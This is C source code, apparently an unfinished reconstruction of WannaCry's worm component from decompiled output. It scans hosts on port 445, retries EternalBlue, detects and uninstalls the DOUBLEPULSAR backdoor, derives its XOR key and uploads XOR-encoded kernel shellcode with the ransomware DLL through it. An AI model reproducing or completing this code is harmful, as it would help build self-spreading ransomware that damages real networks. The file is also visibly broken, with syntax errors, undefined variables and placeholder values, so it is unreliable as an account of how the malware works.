//https://blog.malwarebytes.com/threat-analysis/2017/05/the-worm-that-spreads-wanacrypt0r/
//skeleton code at this moment
//still a work in progress

unsigned int ComputerDOUBLEPULSARXorKey(unsigned int key)
{
	return 2 * key ^ ((((key >> 16) | key & 0xFF0000) >> 8) | (((key << 16) | key & 0xFF00) << 8));
}

int xor_payload(int xor_key, int buf, int size)
{
	int i;
	char __xor_key[5];
	i = 0;
	*&__xor_key[1] = 0;
	*__xor_key = xor_key;
	if (size <= 0)
		return 0;
	do
	{
		*(i + buf) ^= __xor_key[i % 4];
		++i;
	} while ( i < size );
	return 0;
}

//EXE file global here
HGLOBAL EXE_BUFFER;
HGLOBAL hDLL_x86;
HGLOBAL hDLL_x64;

//init the DLL payload here
//read from Wannacry in IDA
//also here: https://www.acronis.com/en-us/blog/posts/wannacry-attack-what-it-and-how-protect-your-computer
HGLOBAL initialize_payload()
{
	/*
	32-bit dll start address 0x40B020, size is 0x4060 bytes
	64-bit dll start address 0x40F080, size is 0xc8a4 bytes
	*/
	DWORD NumberOfBytesRead;
	DWORD fileSize;
	//size = 0x4060 converted to decimal: 16480
	hDLL_x86 = GlobalAlloc(GMEM_ZEROINIT, 5298176); 
	/* 0x50D000 found in IDA but most likely: 0x506000 for 32 bit */
	
	//size = 0xc8a4 converted to decimal: 51364
	hDLL_x64 = GlobalAlloc(GMEM_ZEROINIT, 5298176); //0x50D000 found in IDA
	
	//if no errors continue, otherwise close and abort()
	if(hDLL_x86 || hDLL_x64)
	{
		//GENERIC_READ is 0x80000000 and GENERIC_WRITE is 0x40000000
		HANDLE fileHandle = CreateFileA(Filename, 0x80000000, 1, NULL, 3, 4, NULL);
		if(fileHandle != INVALID_FILE_HANDLE)
		{
			fileSize = GetFileSize(fileHandle, NULL);
			EXE_BUFFER = GlobalAlloc(GMEM_ZEROINIT, fileSize); 
			ReadFile(fileHandle, EXE_BUFFER, &fileSize, &NumberOfBytesRead, 0);
    			CloseHandle(fileHandle);
		}
	}
	else
	{
		GlobalFree(hMemory_x86);
		GlobalFree(hMemory_x64);
		abort(); // or return NULL;
	}
}

//https://stackoverflow.com/questions/37838490/how-to-properly-set-a-flag-in-the-write-fds-and-select-in-c
int canConnectToPort445(char *ip)
{
	struct sockaddr name;
	struct timeval timeout;
	fd_set writefds;
	SOCKET control_sock;
	u_long argp;
	int result;
	
     	FD_ZERO(&writefds);    

	name.sin_family = AF_INET;
	name.sin_addr.s_addr = inet_addr(ip);
	name.sin_port = htons(445);

	control_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(control_sock == -1)
	{
		result = 0;
	} else {
		ioctlsocket(control_sock, FIONBIO, &argp);
	 	writefds.fd_array[0] = control_sock;
		writefds.fd_count = 1;
		timeout.tv_sec = 1;
    		timeout.tv_usec = 0;
		connect(control_sock, (struct sockaddr*)&name, sizeof(name));
		int ret = select(0, 0, &writefds, 0, &timeout);
		closesocket(control_sock);
		result = ret;
	}
	return result;
}

int IsDOUBLEPULSAR_Present(char *host, int flagUninstall, u_short hostshort)
{
	SOCKET dsock;
	struct sockaddr name;
	char userid[2];
   	char treeid[2];
	char recvbuff[1024];

	name.sin_family = AF_INET;
    	name.sin_addr.s_addr = inet_addr(host);
    	name.sin_port = htons(hostshort);
	dsock = socket(AF_INET, SOCK_STREAM, 0);
	connect(dsock, (struct sockaddr*) &name, sizeof(name));
	
	//send SMB negociate packet
	send(dsock, (char*)SmbNegociate, sizeof(SmbNegociate) - 1, 0);
	recv(dsock, (char*)recvbuff, sizeof(recvbuff), 0);
	
	//send Session Setup AndX request
	send(dsock, (char*)Session_Setup_AndX_Request, sizeof(Session_Setup_AndX_Request) - 1, 0);
	recv(dsock, (char*)recvbuff, sizeof(recvbuff), 0);
	
	//copy userID from recvbuff @ 32,33
	userid[0] = recvbuff[32];
	userid[1] = recvbuff[33];
	
	//update userID in the tree connect request
    	treeConnectRequest[32] = userid[0];
    	treeConnectRequest[33] = userid[1];
	send(dsock, (char*)treeConnectRequest, sizeof(treeConnectRequest) - 1, 0);
	recv(dsock, (char*)recvbuff, sizeof(recvbuff), 0);
	
	//copy treeID from recvbuff @ 28, 29
    	treeid[0] = recvbuff[28];
   	treeid[1] = recvbuff[29];
	
	trans2_session_setup[28] = treeid[0];
        trans2_session_setup[29] = treeid[1]
        trans2_session_setup[32] = userid[0];
        trans2_session_setup[33] = userid[1];

	send(dsock, (char*)trans2_session_setup, sizeof(trans2_session_setup) - 1, 0);
	recv(dsock, (char*)recvbuff, sizeof(recvbuff), 0);
	
	if (recvbuff[34] == 0x51)
	{
		if ( flagUninstall )
		{
			WORD burn1, burn2, burn3, burn4, burn5;

		    	burn1 = 66;       //update multiplex ID to x42
		    	burn2 = 14;       //burn command - trans2_session_setup[49] = "\x0e"
		    	burn3 = 105;      //burn command - trans2_session_setup[50] = "\x69"
		    	burn4 = 0;        //burn command - trans2_session_setup[51] = "\x00"
		    	burn5 = 0;        //burn command - trans2_session_setup[52] = "\x00"

		    	//modify our trans2 session packet to include the burn command
		    	memcpy(trans2_session_setup + 0x22, (char*)&burn1, 1);
		    	memcpy(trans2_session_setup + 0x31, (char*)&burn2, 1);
		    	memcpy(trans2_session_setup + 0x32, (char*)&burn3, 1);
		    	memcpy(trans2_session_setup + 0x33, (char*)&burn4, 1);
		    	memcpy(trans2_session_setup + 0x34, (char*)&burn5, 1);
			send(dsock, (char*)trans2_session_setup, sizeof(trans2_session_setup) - 1, 0);
            		recv(dsock, (char*)uninstall_response, 1024, 0);
			closesocket(dsock);
			return 1;
		}
		closesocket(dsock);
	}
	return 0;
}

int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, int xkey)
{
	/*
	DWORD WannacryFileSize = value of -> ReadFile Wannacry EXE into -> EXE_BUFFER_SOMEWHERE
	DWORD totalPayloadSize_x86 = 0x4060 + 0x1305 + WannacryFileSize;
	DWORD totalPayloadSize_x64 = 0xc8a4 + 0x1800 + WannacryFileSize;
	*/
	
	/*
	/*
	32-bit dll start address 0x40B020, size is 0x4060 bytes
	64-bit dll start address 0x40F080, size is 0xc8a4 bytes

	32-bit shellcode start address 0x42E758, size is 0x1305 bytes
	64-bit shellcode start address 0x42FA60, size 0x1800 bytes
	*/
	const void *rundll_shellcode;
	int shellcode_payload_size;
	int DLLSize;
	if(architectureType)
	{
		//32 bits
		shellcode_payload_size = 0x1305; //decimal: 4869
		DLLSize = 0x4060;
	}
	else
	{
		//64 bits
		shellcode_payload_size = 0x1800; //decimal: 6144;
		DLLSize = 0xc8a4;
	}
	HGLOBAL hMem = GlobalAlloc(GMEM_ZEROINIT, shellcode_payload_size + DLLSize + 12);
	
	//could be wrong but copied from IDA
	//looks like the DLL
	memcpy(hMem + shellcode_payload_size, h64_DLL, DLLSize);
	if(architectureType)
	{
		//32 bits
		rundll_shellcode = &x86_kernel_shellcode;
		
	}
	else
	{
		//64 bits
		rundll_shellcode = &x64_kernel_shellcode;
	}
	memcpy(hMem, rundll_shellcode, shellcode_payload_size);
	xor_payload(xkey, hMem, UNKNOWN);
	memcpy(send_buffer, wannacry_trans2_exec_packet, 70);
	
	v9 = total_size / 4096;
	v10 = total_size % 4096;
	
	/* may be needed for signature
	#define __PAIR__(high, low) (((unsigned long)(high)<<sizeof(high)*8) | low)
	
	sources:
	https://www.cnblogs.com/shangdawei/p/3537773.html
	#define _DWORD uint32
        #define _QWORD uint64
	https://www.cnblogs.com/goodhacker/p/7692443.html
	https://cloud.tencent.com/developer/article/1432392
	https://github.com/nihilus/hexrays_tools/blob/master/code/defs.h
	*/
	
	int ctx;
	char signature[9];
	if(total_size / 4096 > 0)
	{
		for(i=0; ctx=i)
		{
			//loop through the packets
			//signature = __PAIR__(4096, UNK); //UNK = totalsize?
			//*(DWORD *)&signature[8] = ctx;
			xor_payload(xkey, signature, 12);
			memcpy(send_buffer, (char *)hMem + ctx, 4096);
			send(socket, (char*)send_buffer, 4178, 0);
			recv(socket, (char*)recv_buffer, 4096, 0);
			if(recvbuff[34] != 82)
			{
				//error, doublePulsar should return 82
				break;
			}
			ctx += 4096;
		}
	}
	
	if ( v10 > 0 )
	{
		v25 = htons(v10+78);
		xor_payload(xkey, session_parameters, 12);
	}
}

int runPayloadOnTarget(char *host, u_short hostshort)
{
	unsigned int signature_long;
	unsigned int XorKey;
	SOCKET dsock;
	struct sockaddr name;
	char userid[2];
   	char treeid[2];
	char recvbuff[1024];

	name.sin_family = AF_INET;
    	name.sin_addr.s_addr = inet_addr(host);
    	name.sin_port = htons(hostshort);
	dsock = socket(AF_INET, SOCK_STREAM, 0);
	connect(dsock, (struct sockaddr*) &name, sizeof(name));
	
	//send SMB negociate packet
	send(dsock, (char*)SmbNegociate, sizeof(SmbNegociate) - 1, 0);
	recv(dsock, (char*)recvbuff, sizeof(recvbuff), 0);
	
	//send Session Setup AndX request
	send(dsock, (char*)Session_Setup_AndX_Request, sizeof(Session_Setup_AndX_Request) - 1, 0);
	recv(dsock, (char*)recvbuff, sizeof(recvbuff), 0);
	
	//copy userID from recvbuff @ 32,33
	userid[0] = recvbuff[32];
	userid[1] = recvbuff[33];
	
	//update userID in the tree connect request
    	treeConnectRequest[32] = userid[0];
    	treeConnectRequest[33] = userid[1];
	send(dsock, (char*)treeConnectRequest, sizeof(treeConnectRequest) - 1, 0);
	recv(dsock, (char*)recvbuff, sizeof(recvbuff), 0);
	
	//copy treeID from recvbuff @ 28, 29
    	treeid[0] = recvbuff[28];
   	treeid[1] = recvbuff[29];
	
	trans2_session_setup[28] = treeid[0];
        trans2_session_setup[29] = treeid[1]
        trans2_session_setup[32] = userid[0];
        trans2_session_setup[33] = userid[1];

	send(dsock, (char*)trans2_session_setup, sizeof(trans2_session_setup) - 1, 0);
	recv(dsock, (char*)recvbuff, sizeof(recvbuff), 0);
	
	unsigned char signature[4];
	if (recvbuff[34] == 0x51)
	{
		ArchitectureType = recvbuff[22];
		
		signature[0] = recvbuff[18];
		signature[1] = recvbuff[19];
		signature[2] = recvbuff[20];
		signature[3] = recvbuff[21];
		memcpy((unsigned int*)&signature_long, (unsigned int*)&signature, sizeof(unsigned int));
		XorKey = ComputeDOUBLEPULSARXorKey(signature_long);
		InjectWannaCryDLLViaDoublePulsarBackdoor(dsock, ArchitectureType, XorKey);
	}
	closesocket(dsock);
	return 0;
}

DWORD MS17_010(DWORD LPPARAM)
{
	lpparam = (struct in_addr) ;
	int attemptCount;
	//CheckMS17Vulnerability here; continue if vulnerable
	if ( tryFirstSetBuffers(&target, 445))
	{
		attemptCount = 0;
		do
		{
			Sleep(3000;
			if ( IsDOUBLEPULSARInstalled(&target, 1, 445) )
			      break;
		      	Sleep(3000);
			//EternalBlue pwn here
		      	trySecondSetBuffers(&target, 445);
		      	++attemptCount;
		 } while ( attemptCount < 5 );
	}
	Sleep(3000);
	if ( IsDOUBLEPULSARInstalled(&target, 1, 445))
	{
		runPayloadOnTarget(&target, 1, 445);
	}
	endthreadex(0);
	return 0;
}
			      
int scanIP(DWORD LPPARAM)
{
	if (canConnectToPort445(target) > 0)
	{
		if( beginthreadex(NULL, MS17_010, (DWORD)LPPARAM, 0, 0) )
		{
			if (WaitForSingleObject(v1, 60000) == 258 ))
			{
				TerminateThread(v2, 0);
      				CloseHandle();
			}
		}
	}
}

int threadMain()
{
	//create 100 threads
	beginthreadex(0, 0, scanIP, v1[i], 0, 0);
}
